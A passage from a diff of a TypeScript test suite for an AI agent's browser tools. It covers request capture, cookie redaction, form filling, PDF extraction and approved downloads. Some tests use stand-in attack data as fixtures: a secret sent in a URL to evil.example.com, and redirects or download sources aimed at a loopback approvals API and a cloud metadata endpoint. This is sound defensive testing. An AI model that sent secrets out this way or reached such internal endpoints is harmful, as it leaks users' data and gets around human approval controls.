+    handlers.get("response")!(fakeResponse("https://cdn.example.com/app.js"));
+
+    const parsed = JSON.parse(await browserRequests("net-filter", { filter: "api." })) as { requests?: Array<{ url: string }> };
+    expect(parsed.requests).toHaveLength(1);
+    expect(parsed.requests![0]!.url).toBe("https://api.example.com/items");
+  });
+
+  test("an adopted page logs requests against the task that owns it now, not the hooking task", async () => {
+    const { page, handlers } = makeNetworkPage();
+    browserTest.installFakeSessionWithPageForTest("net-owner-a", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-owner-a", page);
+    // Adoption by a later task refreshes ownership without re-listening.
+    browserTest.clearFakeSessionsForTest();
+    browserTest.installFakeSessionWithPageForTest("net-owner-b", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-owner-b", page);
+
+    handlers.get("response")!(fakeResponse("https://api.example.com/after-adoption"));
+
+    const forB = JSON.parse(await browserRequests("net-owner-b", {})) as { requests?: Array<{ url: string }> };
+    expect(forB.requests).toHaveLength(1);
+    expect(forB.requests![0]!.url).toBe("https://api.example.com/after-adoption");
+    browserTest.installFakeSessionWithPageForTest("net-owner-a", page as Partial<import("playwright-core").Page>);
+    const forA = JSON.parse(await browserRequests("net-owner-a", {})) as { requests?: Array<{ url: string }> };
+    expect(forA.requests ?? []).toHaveLength(0);
+  });
+
+  test("a registered secret inside a recorded URL is redacted in the tool result", async () => {
+    const { page, handlers } = makeNetworkPage();
+    browserTest.installFakeSessionWithPageForTest("net-redact", page as Partial<import("playwright-core").Page>);
+    browserTest.attachNetworkCaptureForTest("net-redact", page);
+    browserTest.recordFilledSecretForTest("net-redact", "hunter2secret");
+    handlers.get("response")!(fakeResponse("https://evil.example.com/?q=hunter2secret"));
+
+    const raw = await browserRequests("net-redact", {});
+    expect(raw).not.toContain("hunter2secret");
+    const parsed = JSON.parse(raw) as { requests?: Array<{ url: string }> };
+    expect(parsed.requests![0]!.url).toBe("https://evil.example.com/?q=[redacted]");
+  });
+});
+
+// Curated viewport-resize utility: dimensions clamp to 320–3840 × 240–2160
+// and the applied size is reported back (with a `clamped` flag when the
+// request was adjusted).
+describe("browserResize", () => {
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  function installResizePage(taskId: string): { sizes: Array<{ width: number; height: number }> } {
+    const sizes: Array<{ width: number; height: number }> = [];
+    const page = {
+      url: () => "https://example.com/",
+      setViewportSize: async (size: { width: number; height: number }) => {
+        sizes.push(size);
+      }
+    } as unknown as Partial<import("playwright-core").Page>;
+    browserTest.installFakeSessionWithPageForTest(taskId, page);
+    return { sizes };
+  }
+
+  test("applies an in-range size as-is", async () => {
+    const { sizes } = installResizePage("resize-ok");
+    const raw = await browserResize("resize-ok", { width: 1280, height: 800 });
+    const parsed = JSON.parse(raw) as { success: boolean; width?: number; height?: number; clamped?: boolean };
+    expect(parsed.success).toBe(true);
+    expect(parsed.width).toBe(1280);
+    expect(parsed.height).toBe(800);
+    expect(parsed.clamped).toBeUndefined();
+    expect(sizes).toEqual([{ width: 1280, height: 800 }]);
+  });
+
+  test("clamps out-of-range dimensions and flags the adjustment", async () => {
+    const { sizes } = installResizePage("resize-clamp");
+    const raw = await browserResize("resize-clamp", { width: 10_000, height: 10 });
+    const parsed = JSON.parse(raw) as { success: boolean; width?: number; height?: number; clamped?: boolean };
+    expect(parsed.success).toBe(true);
+    expect(parsed.width).toBe(3840);
+    expect(parsed.height).toBe(240);
+    expect(parsed.clamped).toBe(true);
+    expect(sizes).toEqual([{ width: 3840, height: 240 }]);
+
+    const low = await browserResize("resize-clamp", { width: 1, height: 9999 });
+    const lowParsed = JSON.parse(low) as { width?: number; height?: number };
+    expect(lowParsed.width).toBe(320);
+    expect(lowParsed.height).toBe(2160);
+  });
+
+  test("rejects missing or non-numeric dimensions", async () => {
+    installResizePage("resize-bad");
+    expect(JSON.parse(await browserResize("resize-bad", { height: 800 })).error).toMatch(/width/);
+    expect(JSON.parse(await browserResize("resize-bad", { width: 800 })).error).toMatch(/height/);
+    expect(JSON.parse(await browserResize("resize-bad", { width: "wide", height: 800 })).error).toMatch(/width/);
+  });
+});
+
+// Curated cookie READ: values are ALWAYS replaced with "[redacted]" —
+// only name/domain/path/expiry/flags reach the model. No write surface.
+describe("browserCookies", () => {
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  const sessionCookie = {
+    name: "session_id",
+    value: "supersecretsessiontoken",
+    domain: ".example.com",
+    path: "/",
+    expires: 1893456000,
+    httpOnly: true,
+    secure: true,
+    sameSite: "Lax" as const
+  };
+
+  test("returns cookie metadata with values redacted, scoped to the current page URL", async () => {
+    const cookieCalls: Array<string | undefined> = [];
+    const page = { url: () => "https://example.com/account" } as unknown as Partial<import("playwright-core").Page>;
+    const context = {
+      cookies: async (url?: string) => {
+        cookieCalls.push(url);
+        return [sessionCookie];
+      }
+    } as unknown as Partial<import("playwright-core").BrowserContext>;
+    browserTest.installFakeSessionWithPageAndContextForTest("cookies-page", page, context);
+
+    const raw = await browserCookies("cookies-page", {});
+    expect(raw).not.toContain("supersecretsessiontoken");
+    const parsed = JSON.parse(raw) as {
+      success: boolean;
+      scope?: string;
+      cookies?: Array<{ name: string; value: string; domain: string; httpOnly: boolean; secure: boolean; sameSite: string }>;
+    };
+    expect(parsed.success).toBe(true);
+    expect(parsed.scope).toBe("page");
+    expect(cookieCalls).toEqual(["https://example.com/account"]);
+    expect(parsed.cookies).toHaveLength(1);
+    expect(parsed.cookies![0]!.value).toBe("[redacted]");
+    expect(parsed.cookies![0]!.name).toBe("session_id");
+    expect(parsed.cookies![0]!.domain).toBe(".example.com");
+    expect(parsed.cookies![0]!.httpOnly).toBe(true);
+    expect(parsed.cookies![0]!.secure).toBe(true);
+    expect(parsed.cookies![0]!.sameSite).toBe("Lax");
+  });
+
+  test("falls back to whole-context cookies when no http(s) page is open", async () => {
+    const cookieCalls: Array<string | undefined> = [];
+    const page = { url: () => "about:blank" } as unknown as Partial<import("playwright-core").Page>;
+    const context = {
+      cookies: async (url?: string) => {
+        cookieCalls.push(url);
+        return [sessionCookie];
+      }
+    } as unknown as Partial<import("playwright-core").BrowserContext>;
+    browserTest.installFakeSessionWithPageAndContextForTest("cookies-blank", page, context);
+
+    const raw = await browserCookies("cookies-blank", {});
+    const parsed = JSON.parse(raw) as { success: boolean; scope?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.scope).toBe("context");
+    expect(cookieCalls).toEqual([undefined]);
+    expect(raw).not.toContain("supersecretsessiontoken");
+  });
+
+  test("fails cleanly when the session context has no cookie surface", async () => {
+    const page = { url: () => "https://example.com/" } as unknown as Partial<import("playwright-core").Page>;
+    browserTest.installFakeSessionWithPageForTest("cookies-none", page);
+    const parsed = JSON.parse(await browserCookies("cookies-none", {})) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toMatch(/not supported/);
+  });
+
+  test("refuses to read cookies while the page sits on a disallowed origin", async () => {
+    const cookieCalls: Array<string | undefined> = [];
+    const page = { url: () => "http://127.0.0.1:7338/admin" } as unknown as Partial<import("playwright-core").Page>;
+    const context = {
+      cookies: async (url?: string) => {
+        cookieCalls.push(url);
+        return [sessionCookie];
+      }
+    } as unknown as Partial<import("playwright-core").BrowserContext>;
+    browserTest.installFakeSessionWithPageAndContextForTest("cookies-blocked", page, context);
+
+    const raw = await browserCookies("cookies-blocked", {});
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("refusing to read cookies");
+    // The cookie surface was never consulted.
+    expect(cookieCalls).toEqual([]);
+    expect(raw).not.toContain("supersecretsessiontoken");
+  });
+});
+
+describe("browserFillForm", () => {
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.resetFilledSecretsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+  });
+
+  function makeFillLocator(log: Array<{ ref: string; text: string }>, ref: string, failWith?: string) {
+    return {
+      fill: async (text: string, _opts?: { timeout?: number }) => {
+        if (failWith) throw new Error(failWith);
+        log.push({ ref, text });
+      }
+    };
+  }
+
+  test("fills every field in order and returns one post-action snapshot", async () => {
+    const fakePage = makeFakePageForRefTools();
+    browserTest.installFakeSessionWithPageForTest("fill-form", fakePage);
+    const fills: Array<{ ref: string; text: string }> = [];
+    const refs = new Map<string, unknown>();
+    refs.set("@e1", makeFillLocator(fills, "@e1"));
+    refs.set("@e2", makeFillLocator(fills, "@e2"));
+    browserTest.setFakeSessionRefsForTest("fill-form", refs);
+
+    const raw = await browserFillForm("fill-form", {
+      fields: [
+        { ref: "@e1", text: "Shelden" },
+        { ref: "@e2", text: "Seattle" }
+      ]
+    });
+    const parsed = JSON.parse(raw) as { success: boolean; filled?: string[]; snapshot?: string; snapshotMode?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.filled).toEqual(["@e1", "@e2"]);
+    expect(fills).toEqual([
+      { ref: "@e1", text: "Shelden" },
+      { ref: "@e2", text: "Seattle" }
+    ]);
+    // One snapshot for the whole batch, same shape browser_type returns.
+    expect(parsed.snapshotMode === "full" || parsed.snapshotMode === "diff").toBe(true);
+    expect(typeof parsed.snapshot).toBe("string");
+  });
+
+  test("stops at the first unknown ref and reports filled vs not attempted", async () => {
+    const fakePage = makeFakePageForRefTools();
+    browserTest.installFakeSessionWithPageForTest("fill-stop", fakePage);
+    const fills: Array<{ ref: string; text: string }> = [];
+    const refs = new Map<string, unknown>();
+    refs.set("@e1", makeFillLocator(fills, "@e1"));
+    refs.set("@e3", makeFillLocator(fills, "@e3"));
+    browserTest.setFakeSessionRefsForTest("fill-stop", refs);
+
+    const raw = await browserFillForm("fill-stop", {
+      fields: [
+        { ref: "@e1", text: "a" },
+        { ref: "@e2", text: "b" },
+        { ref: "@e3", text: "c" }
+      ]
+    });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("Unknown ref @e2");
+    expect(parsed.error).toContain("Filled before failure: @e1");
+    expect(parsed.error).toContain("Not attempted: @e3");
+    // Fields after the failure were never filled.
+    expect(fills).toEqual([{ ref: "@e1", text: "a" }]);
+  });
+
+  test("stops when a fill throws and reports the failing field", async () => {
+    const fakePage = makeFakePageForRefTools();
+    browserTest.installFakeSessionWithPageForTest("fill-throw", fakePage);
+    const fills: Array<{ ref: string; text: string }> = [];
+    const refs = new Map<string, unknown>();
+    refs.set("@e1", makeFillLocator(fills, "@e1", "element is not an <input>"));
+    refs.set("@e2", makeFillLocator(fills, "@e2"));
+    browserTest.setFakeSessionRefsForTest("fill-throw", refs);
+
+    const raw = await browserFillForm("fill-throw", {
+      fields: [
+        { ref: "@e1", text: "a" },
+        { ref: "@e2", text: "b" }
+      ]
+    });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("Fill failed at @e1");
+    expect(parsed.error).toContain("element is not an <input>");
+    expect(parsed.error).toContain("Filled before failure: none");
+    expect(parsed.error).toContain("Not attempted: @e2");
+    expect(fills).toEqual([]);
+  });
+
+  test("rejects a field value containing a registered secret without echoing it", async () => {
+    const fakePage = makeFakePageForRefTools();
+    browserTest.installFakeSessionWithPageForTest("fill-secret", fakePage);
+    const fills: Array<{ ref: string; text: string }> = [];
+    const refs = new Map<string, unknown>();
+    refs.set("@e1", makeFillLocator(fills, "@e1"));
+    refs.set("@e2", makeFillLocator(fills, "@e2"));
+    browserTest.setFakeSessionRefsForTest("fill-secret", refs);
+    browserTest.recordFilledSecretForTest("fill-secret", "hunter2secret");
+
+    const raw = await browserFillForm("fill-secret", {
+      fields: [
+        { ref: "@e1", text: "ordinary" },
+        { ref: "@e2", text: "prefix hunter2secret suffix" }
+      ]
+    });
+    expect(raw).not.toContain("hunter2secret");
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("registered secret");
+    expect(parsed.error).toContain("browser_fill_secrets");
+    // Fails closed before ANY field is filled.
+    expect(fills).toEqual([]);
+  });
+
+  test("rejects malformed fields arguments", async () => {
+    const fakePage = makeFakePageForRefTools();
+    browserTest.installFakeSessionWithPageForTest("fill-args", fakePage);
+    expect(JSON.parse(await browserFillForm("fill-args", {})).error).toMatch(/fields/);
+    expect(JSON.parse(await browserFillForm("fill-args", { fields: [] })).error).toMatch(/fields/);
+    expect(JSON.parse(await browserFillForm("fill-args", { fields: [{ ref: "@e1" }] })).error).toMatch(/text/);
+    expect(JSON.parse(await browserFillForm("fill-args", { fields: [{ text: "x" }] })).error).toMatch(/ref/);
   });
 });
 
@@ -3379,6 +5125,611 @@ describe("browserUploadFile", () => {
       WORKSPACE
     );
     expect(JSON.parse(raw).error).toContain("Unknown ref @e99");
+  });
+});
+
+// PDF detection at the navigation boundary: an application/pdf response
+// returns extracted text (bounded to the snapshot char budget) instead of
+// a useless viewer-DOM snapshot; extraction failures degrade to a
+// structured `pdf: true` hint. The extractor is stubbed so the suite
+// never loads pdfjs-dist.
+describe("browserNavigate PDF handling", () => {
+  // IP-literal host: skips the DNS pre-flight lookup, passes safetyCheck
+  // (public documentation range).
+  const PDF_URL = "https://203.0.113.5/invoice.pdf";
+
+  function makePdfPage(opts: {
+    contentType?: string;
+    body?: (() => Promise<Uint8Array>) | null;
+  } = {}): Partial<import("playwright-core").Page> {
+    const response = {
+      status: () => 200,
+      headers: () => ({ "content-type": opts.contentType ?? "application/pdf" }),
+      ...(opts.body === null ? {} : { body: opts.body ?? (async () => new TextEncoder().encode("%PDF-1.4 fake")) })
+    };
+    return {
+      url: () => PDF_URL,
+      title: async () => "invoice.pdf",
+      goto: (async () => response) as unknown as import("playwright-core").Page["goto"],
+      evaluate: (async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 })) as unknown as import("playwright-core").Page["evaluate"]
+    } as Partial<import("playwright-core").Page>;
+  }
+
+  // Re-fetch tests stub the native fetch seam; the rejecting default
+  // keeps an accidental fall-through from ever leaving the process
+  // (no network in tests).
+  const rejectingFetch = async (): Promise<Response> => {
+    throw new Error("unexpected network fetch in test");
+  };
+
+  beforeEach(() => {
+    browserTest.setPdfRefetchFetchForTest(rejectingFetch);
+  });
+
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+    browserTest.setPdfTextExtractorForTest(null);
+    browserTest.setPdfExtractMaxBytesForTest(null);
+    browserTest.setPdfRefetchFetchForTest(null);
+  });
+
+  test("returns extracted text for an application/pdf response instead of a DOM snapshot", async () => {
+    browserTest.setPdfTextExtractorForTest(async () => ({ text: "INVOICE TOTAL $42 due 2026-07-01" }));
+    browserTest.installFakeSessionWithPageForTest("pdf-ok", makePdfPage());
+
+    const raw = await browserNavigate("pdf-ok", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string; snapshot?: string; status?: number };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.status).toBe(200);
+    expect(parsed.pdfText).toContain("INVOICE TOTAL $42");
+    expect(parsed.snapshot).toBeUndefined();
+  });
+
+  test("bounds extracted text to the snapshot char budget with a counted marker", async () => {
+    browserTest.setPdfTextExtractorForTest(async () => ({ text: "A".repeat(32_500) }));
+    browserTest.installFakeSessionWithPageForTest("pdf-budget", makePdfPage());
+
+    const raw = await browserNavigate("pdf-budget", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdfText?: string; truncated?: boolean };
+    expect(parsed.success).toBe(true);
+    expect(parsed.truncated).toBe(true);
+    expect(parsed.pdfText).toContain("[...PDF text truncated +500 more chars]");
+    // 32_000 budget chars + the marker line.
+    expect(parsed.pdfText!.length).toBeLessThan(32_100);
+  });
+
+  test("degrades to a structured hint when extraction fails", async () => {
+    browserTest.setPdfTextExtractorForTest(async () => null);
+    browserTest.installFakeSessionWithPageForTest("pdf-fail", makePdfPage());
+
+    const raw = await browserNavigate("pdf-fail", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.pdfText).toBeUndefined();
+    expect(parsed.note).toContain("text extraction was not possible");
+    expect(parsed.note).toContain("do not re-snapshot");
+  });
+
+  test("skips extraction above the byte cap and says so", async () => {
+    let extractorCalls = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "should not run" };
+    });
+    browserTest.setPdfExtractMaxBytesForTest(8);
+    browserTest.installFakeSessionWithPageForTest("pdf-cap", makePdfPage());
+
+    const raw = await browserNavigate("pdf-cap", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.note).toContain("extraction cap");
+    expect(extractorCalls).toBe(0);
+  });
+
+  test("re-fetches PDF bytes via native fetch when the response body is unavailable, carrying context cookies", async () => {
+    // Chrome's PDF viewer intercepts main-frame PDF responses, so
+    // response.body() throws (or returns viewer HTML — see the next test)
+    // on real PDF navigations — the native re-fetch of the already-gated
+    // final URL is the path real PDFs take. The browser context's cookies
+    // for the URL ride along as a Cookie header so auth-gated PDFs work.
+    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
+    let fetchedUrl: string | undefined;
+    let sentCookie: string | null | undefined;
+    browserTest.setPdfRefetchFetchForTest(async (url, init) => {
+      fetchedUrl = url;
+      sentCookie = new Headers(init.headers).get("cookie");
+      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
+    });
+    browserTest.installFakeSessionWithPageAndContextForTest("pdf-refetch", makePdfPage({
+      body: async () => {
+        throw new Error("Protocol error (Network.getResponseBody): No resource with given identifier found");
+      }
+    }), {
+      cookies: (async () => [
+        { name: "session", value: "abc123" },
+        { name: "tenant", value: "t-9" }
+      ]) as unknown as import("playwright-core").BrowserContext["cookies"]
+    });
+
+    const raw = await browserNavigate("pdf-refetch", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    // The extractor ran on the re-fetched bytes ("%PDF-1.4 real bytes" = 19).
+    expect(parsed.pdfText).toBe("extracted:19");
+    expect(fetchedUrl).toBe(PDF_URL);
+    expect(sentCookie).toBe("session=abc123; tenant=t-9");
+  });
+
+  test("re-fetches when the response body is the PDF viewer's HTML wrapper, not PDF bytes", async () => {
+    // The other interception mode: response.body() resolves SUCCESSFULLY
+    // with the viewer's HTML wrapper bytes. Only the %PDF- magic check
+    // routes this case to the re-fetch — the throw/empty checks never fire.
+    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
+    let fetchedUrl: string | undefined;
+    browserTest.setPdfRefetchFetchForTest(async (url) => {
+      fetchedUrl = url;
+      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-viewer-html", makePdfPage({
+      body: async () => new TextEncoder().encode("<!DOCTYPE html><html><body>viewer</body></html>")
+    }));
+
+    const raw = await browserNavigate("pdf-viewer-html", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    // The extractor ran on the re-fetched bytes ("%PDF-1.4 real bytes" = 19),
+    // never on the HTML wrapper (48 bytes).
+    expect(parsed.pdfText).toBe("extracted:19");
+    expect(fetchedUrl).toBe(PDF_URL);
+  });
+
+  test("follows a re-fetch redirect to an allowed URL and extracts from the target", async () => {
+    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
+    const REDIRECT_TARGET = "https://203.0.113.6/storage/invoice-final.pdf";
+    const fetchedUrls: string[] = [];
+    browserTest.setPdfRefetchFetchForTest(async (url) => {
+      fetchedUrls.push(url);
+      if (url === PDF_URL) {
+        return new Response(null, { status: 302, headers: { location: REDIRECT_TARGET } });
+      }
+      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-redirect-ok", makePdfPage({
+      body: async () => {
+        throw new Error("intercepted");
+      }
+    }));
+
+    const raw = await browserNavigate("pdf-redirect-ok", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.pdfText).toBe("extracted:19");
+    expect(fetchedUrls).toEqual([PDF_URL, REDIRECT_TARGET]);
+  });
+
+  test("aborts the re-fetch when a redirect hop targets a blocked host", async () => {
+    // A redirect must never reach a host the navigation gates block —
+    // the loopback target here would expose the runtime's own API.
+    let extractorCalls = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "should not run" };
+    });
+    const fetchedUrls: string[] = [];
+    browserTest.setPdfRefetchFetchForTest(async (url) => {
+      fetchedUrls.push(url);
+      return new Response(null, { status: 302, headers: { location: "http://127.0.0.1:8787/api/runtime/approvals" } });
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-redirect-blocked", makePdfPage({
+      body: async () => {
+        throw new Error("intercepted");
+      }
+    }));
+
+    const raw = await browserNavigate("pdf-redirect-blocked", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.note).toContain("could not retrieve PDF bytes");
+    // The blocked hop was never requested.
+    expect(fetchedUrls).toEqual([PDF_URL]);
+    expect(extractorCalls).toBe(0);
+  });
+
+  test("notes that the bytes could not be retrieved when body and re-fetch both return HTML", async () => {
+    let extractorCalls = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "should not run" };
+    });
+    browserTest.setPdfRefetchFetchForTest(async () =>
+      new Response(new TextEncoder().encode("<!DOCTYPE html><html><body>error page</body></html>"), { status: 200 }));
+    browserTest.installFakeSessionWithPageForTest("pdf-html-twice", makePdfPage({
+      body: async () => new TextEncoder().encode("<!DOCTYPE html><html><body>viewer</body></html>")
+    }));
+
+    const raw = await browserNavigate("pdf-html-twice", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.note).toContain("could not retrieve PDF bytes");
+    expect(extractorCalls).toBe(0);
+  });
+
+  test("does not re-fetch when the response body is already valid PDF bytes", async () => {
+    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
+    let fetchCalls = 0;
+    browserTest.setPdfRefetchFetchForTest(async () => {
+      fetchCalls++;
+      return new Response(new TextEncoder().encode("%PDF-1.4 should not be fetched"), { status: 200 });
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-no-refetch", makePdfPage({
+      body: async () => new TextEncoder().encode("%PDF-1.4 direct bytes")
+    }));
+
+    const raw = await browserNavigate("pdf-no-refetch", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdfText?: string };
+    expect(parsed.success).toBe(true);
+    // "%PDF-1.4 direct bytes" = 21 — the body() bytes, not the re-fetch.
+    expect(parsed.pdfText).toBe("extracted:21");
+    expect(fetchCalls).toBe(0);
+  });
+
+  test("notes that the PDF bytes could not be retrieved when both body and re-fetch fail", async () => {
+    // A rejecting fetch (network error / AbortSignal timeout) must
+    // degrade to the honest note — never crash the process.
+    let extractorCalls = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "should not run" };
+    });
+    browserTest.setPdfRefetchFetchForTest(async () => {
+      throw new Error("The operation timed out");
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-no-bytes", makePdfPage({
+      body: async () => {
+        throw new Error("intercepted");
+      }
+    }));
+
+    const raw = await browserNavigate("pdf-no-bytes", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.note).toContain("could not retrieve PDF bytes");
+    expect(parsed.note).toContain("do not re-snapshot");
+    expect(extractorCalls).toBe(0);
+  });
+
+  test("enforces the byte cap on re-fetched bytes via content-length before buffering", async () => {
+    let extractorCalls = 0;
+    let bodyReads = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "should not run" };
+    });
+    browserTest.setPdfExtractMaxBytesForTest(8);
+    // A minimal Response-shaped fake: a real Response buffers its body at
+    // construction, which would hide whether the cap short-circuited the
+    // arrayBuffer() read.
+    browserTest.setPdfRefetchFetchForTest(async () => ({
+      status: 200,
+      headers: new Headers({ "content-length": "100" }),
+      arrayBuffer: async () => {
+        bodyReads++;
+        return new Uint8Array(100).buffer;
+      }
+    }) as unknown as Response);
+    browserTest.installFakeSessionWithPageForTest("pdf-refetch-cap", makePdfPage({
+      body: async () => {
+        throw new Error("intercepted");
+      }
+    }));
+
+    const raw = await browserNavigate("pdf-refetch-cap", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBe(true);
+    expect(parsed.note).toContain("extraction cap");
+    expect(bodyReads).toBe(0);
+    expect(extractorCalls).toBe(0);
+  });
+
+  test("non-PDF responses keep the normal snapshot path", async () => {
+    let extractorCalls = 0;
+    browserTest.setPdfTextExtractorForTest(async () => {
+      extractorCalls++;
+      return { text: "nope" };
+    });
+    browserTest.installFakeSessionWithPageForTest("pdf-not", makePdfPage({ contentType: "text/html; charset=utf-8" }));
+
+    const raw = await browserNavigate("pdf-not", { url: PDF_URL });
+    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; snapshot?: string };
+    expect(parsed.success).toBe(true);
+    expect(parsed.pdf).toBeUndefined();
+    expect(typeof parsed.snapshot).toBe("string");
+    expect(extractorCalls).toBe(0);
+  });
+});
+
+// Approved-download executor. Mirrors the upload suite: fake session +
+// fake page whose waitForEvent hands back a stubbed Playwright Download,
+// so save-path, sanitization, collision, and size-cap behavior run
+// without Chromium.
+describe("browserDownloadApproved", () => {
+  const DL_ROOT = "/tmp/gini-browser-download-tests";
+  let prevStateRoot: string | undefined;
+
+  const downloadsDirFor = (instance: string) => join(DL_ROOT, "instances", instance, "downloads");
+
+  beforeEach(() => {
+    prevStateRoot = process.env.GINI_STATE_ROOT;
+    process.env.GINI_STATE_ROOT = DL_ROOT;
+    rmSync(DL_ROOT, { recursive: true, force: true });
+  });
+
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+    browserTest.setDownloadMaxBytesForTest(null);
+    browserTest.setDownloadEventTimeoutForTest(null);
+    if (prevStateRoot === undefined) delete process.env.GINI_STATE_ROOT;
+    else process.env.GINI_STATE_ROOT = prevStateRoot;
+    rmSync(DL_ROOT, { recursive: true, force: true });
+  });
+
+  // Build a fake page + ref'd locator wired so a click resolves the
+  // download promise with a stubbed Download.
+  function installDownloadSession(
+    taskId: string,
+    download: {
+      suggestedFilename: () => string;
+      saveAs: (p: string) => Promise<void>;
+      url?: () => string;
+      cancel?: () => Promise<void>;
+    },
+    opts: { clickThrows?: boolean } = {}
+  ): { clicks: () => number } {
+    let clicks = 0;
+    const fakePage = {
+      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
+      waitForEvent: (() => Promise.resolve(download)) as unknown as import("playwright-core").Page["waitForEvent"]
+    };
+    browserTest.installFakeSessionWithPageForTest(taskId, fakePage);
+    const loc = {
+      click: async () => {
+        if (opts.clickThrows) throw new Error("click failed: element detached");
+        clicks++;
+      }
+    };
+    const refs = new Map<string, unknown>();
+    refs.set("@e2", loc);
+    browserTest.setFakeSessionRefsForTest(taskId, refs);
+    return { clicks: () => clicks };
+  }
+
+  test("clicks the ref, saves under the instance downloads dir, and reports path/size/suggested filename", async () => {
+    const download = {
+      url: () => "https://cdn.example.com/files/invoice.pdf",
+      suggestedFilename: () => "invoice.pdf",
+      saveAs: async (p: string) => writeFileSync(p, "PDF-BYTES")
+    };
+    const counter = installDownloadSession("dl-ok", download);
+
+    const raw = await browserDownloadApproved("dl-ok", "@e2", "dl-ok-inst");
+    const parsed = JSON.parse(raw) as { success: boolean; path?: string; size?: number; suggestedFilename?: string; downloadUrl?: string };
+    expect(parsed.success).toBe(true);
+    expect(counter.clicks()).toBe(1);
+    expect(parsed.path).toBe(join(downloadsDirFor("dl-ok-inst"), "invoice.pdf"));
+    expect(parsed.size).toBe("PDF-BYTES".length);
+    expect(parsed.suggestedFilename).toBe("invoice.pdf");
+    // The real source the bytes came from rides the result for the audit row.
+    expect(parsed.downloadUrl).toBe("https://cdn.example.com/files/invoice.pdf");
+    expect(existsSync(parsed.path!)).toBe(true);
+  });
+
+  test("blocks a download whose source URL fails the SSRF gate, cancelling before any save", async () => {
+    let cancelled = 0;
+    let saved = 0;
+    const download = {
+      // The page URL is allowed; the element's actual download source
+      // resolves to the cloud metadata endpoint — the gate must check the
